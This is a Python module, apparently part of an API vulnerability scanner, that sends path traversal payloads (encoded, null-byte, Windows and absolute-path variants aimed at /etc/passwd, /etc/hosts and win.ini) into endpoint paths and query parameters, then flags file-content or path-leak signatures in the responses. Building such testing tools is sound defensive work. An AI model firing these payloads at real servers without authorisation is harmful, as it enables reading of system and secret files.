"""
Path Traversal Prober

Injects directory traversal sequences into path parameters and query strings,
then scans the response body for known file content signatures.

Two detection layers:
1. CONTENT MATCH  — response body contains recognizable content from a known
                    system file (e.g., root:x:0:0 from /etc/passwd).
2. ERROR LEAK     — response body contains a server-side file path in an error
                    message, confirming the traversal reached the filesystem
                    even if the file wasn't returned.

Works purely from HTTP responses — no server access needed.
"""
import re
from datetime import datetime, timezone

import httpx

from models.schemas import Endpoint, FuzzLog, VulnResult

# ── Traversal payload sequences ───────────────────────────────────────────────

# Each entry is (payload, description)
# Ordered from most obvious to most evasive
_TRAVERSAL_PAYLOADS = [
    # Unix — direct
    ("../../../etc/passwd",                    "Unix direct traversal"),
    ("../../../../etc/passwd",                 "Unix 4-level traversal"),
    ("../../../../../etc/passwd",              "Unix 5-level traversal"),
    # Unix — URL-encoded
    ("..%2F..%2F..%2Fetc%2Fpasswd",           "Unix URL-encoded"),
    ("%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd", "Unix double URL-encoded"),
    # Unix — null byte (truncates extension checks on some servers)
    ("../../../etc/passwd%00",                 "Unix null byte"),
    # Windows
    ("..\\..\\..\\windows\\win.ini",           "Windows direct traversal"),
    ("..%5C..%5C..%5Cwindows%5Cwin.ini",      "Windows URL-encoded"),
    # Absolute paths (some servers pass these directly to fs.readFile)
    ("/etc/passwd",                            "Unix absolute path"),
    ("/etc/hosts",                             "Unix /etc/hosts"),
    # macOS specific
    ("../../../etc/hosts",                     "macOS /etc/hosts traversal"),
    ("../../../../private/etc/passwd",         "macOS private/etc/passwd"),
]

# ── Known file content signatures ─────────────────────────────────────────────

# Patterns that appear in real system files — if any match, traversal succeeded
_FILE_CONTENT_SIGNATURES = [
    # /etc/passwd
    (r"root:x:0:0",                    "/etc/passwd — root entry"),
    (r"root:.*:/bin/(bash|sh|zsh)",    "/etc/passwd — root shell"),
    (r"\w+:x:\d+:\d+:[^:]*:[^:]+:/",  "/etc/passwd — generic user entry"),
    # /etc/hosts
    (r"127\.0\.0\.1\s+localhost",      "/etc/hosts — localhost entry"),
    (r"::1\s+localhost",               "/etc/hosts — IPv6 localhost"),
    # Windows win.ini
    (r"\[fonts\]",                     "Windows win.ini — [fonts] section"),
    (r"\[extensions\]",                "Windows win.ini — [extensions] section"),
    # macOS
    (r"##\s*Host Database",            "macOS /etc/hosts header"),
    # Generic — server source code leak
    (r"require\(['\"]express['\"]",    "Node.js source code leak"),
    (r"from fastapi import",           "Python source code leak"),
    (r"SECRET_KEY\s*=",               "Config file with secret key"),
]

# ── Error message path leak signatures ────────────────────────────────────────

_PATH_LEAK_PATTERNS = [
    r"ENOENT[:\s]+no such file[:\s]+(.+)",
    r"No such file or directory[:\s]+(.+)",
    r"failed to open stream[:\s]+(.+)",
    r"FileNotFoundError[:\s]+\[Errno 2\][^\n]+",
    r"cannot find[:\s]+'?(/[^\s'\"]+)",
    r"open\s+(/[^\s:]+):\s+no such file",
]

_CONTENT_RE = [(re.compile(pat, re.IGNORECASE), label)
               for pat, label in _FILE_CONTENT_SIGNATURES]


# ── Helpers ───────────────────────────────────────────────────────────────────

def _inject_into_url(base_url: str, path: str, payload: str) -> str:
    """Replace the first path param placeholder with the traversal payload."""
    injected = re.sub(r"\{[^}]+\}", lambda _: payload, path, count=1)
    if injected == path:
        # No placeholder — try appending to the last segment
        injected = path.rstrip("/") + "/" + payload
    return base_url.rstrip("/") + injected


def _inject_into_query(base_url: str, path: str, payload: str) -> str:
    """Inject into common query string parameters used for file serving."""
    clean_path = re.sub(r"\{[^}]+\}", lambda _: "index", path)
    return (base_url.rstrip("/") + clean_path
            + f"?file={payload}&path={payload}&filename={payload}&template={payload}")


_PATH_LEAK_RE = [re.compile(p, re.IGNORECASE) for p in _PATH_LEAK_PATTERNS]


def _check_response(body: str) -> tuple[bool, str]:
    """
    Check response body for file content signatures or path leak errors.
    Returns (found, description).
    """
    for pattern, label in _CONTENT_RE:
        if pattern.search(body):
            return True, f"File content match: {label}"

    for pattern in _PATH_LEAK_RE:
        m = pattern.search(body)
        if m:
            return True, f"Server leaked filesystem path in error: {m.group(0)[:200]}"

    return False, ""


# ── Main prober ───────────────────────────────────────────────────────────────

async def probe_path_traversal(
    session_id: str,
    endpoint: Endpoint,
    base_url: str,
    auth_token: str = "Bearer token_user_a",
) -> tuple[list[FuzzLog], VulnResult]:
    """
    Inject traversal payloads into path params and query strings.
    Returns (logs, VulnResult) — no LLM calls made.
    """
    headers = {
        "Authorization": auth_token,
        "Content-Type": "application/json",
    }
    method = "GET"  # traversal is always a read operation
    logs: list[FuzzLog] = []
    attempt = 0

    confirmed_payload = None
    confirmed_evidence = None

    async with httpx.AsyncClient(timeout=10.0) as client:
        for payload, description in _TRAVERSAL_PAYLOADS:
            # Try path parameter injection
            for url in [
                _inject_into_url(base_url, endpoint.path, payload),
                _inject_into_query(base_url, endpoint.path, payload),
            ]:
                attempt += 1
                try:
                    resp = await client.request(method=method, url=url, headers=headers)
                    status = resp.status_code
                    body = resp.text[:500]   # cap stored body size to limit PII at rest
                except httpx.RequestError as e:
                    status = 0
                    body = f"Request error: {e}"

                log = FuzzLog(
                    session_id=session_id,
                    endpoint=endpoint.path,
                    attempt_number=attempt,
                    request={"method": method, "url": url, "headers": headers, "body": None,
                             "traversal_payload": payload, "description": description},
                    response_status=status,
                    response_body=body,
                    timestamp=datetime.now(timezone.utc).isoformat(),
                )
                logs.append(log)

                found, match_description = _check_response(body)
                if found:
                    confirmed_payload = payload
                    confirmed_evidence = (
                        f"Payload: `{payload}` ({description})\n"
                        f"URL: {url}\n"
                        f"Detection: {match_description}\n"
                        f"Response status: {status}\n"
                        f"Body excerpt: {body[:400]}"
                    )
                    break

            if confirmed_payload:
                break

    if confirmed_payload:
        result = VulnResult(
            session_id=session_id,
            endpoint=endpoint.path,
            attack_type="PATH_TRAVERSAL",
            verdict="EXPLOIT_CONFIRMED",
            evidence=confirmed_evidence,
            reasoning=(
                f"The endpoint accepted a path traversal payload and returned "
                f"filesystem content or leaked a server-side path. "
                f"User-supplied input is being passed directly to a file read "
                f"operation without sanitization or path canonicalization."
            ),
        )
    else:
        result = VulnResult(
            session_id=session_id,
            endpoint=endpoint.path,
            attack_type="PATH_TRAVERSAL",
            verdict="NO_VULNERABILITY",
            evidence=f"Tested {attempt} traversal payloads. No file content or path leak detected.",
            reasoning=(
                f"All {attempt} traversal attempts returned no recognizable file content "
                f"and no filesystem path leak in error messages. "
                f"The endpoint appears to sanitize or reject traversal sequences."
            ),
        )

    return logs, result
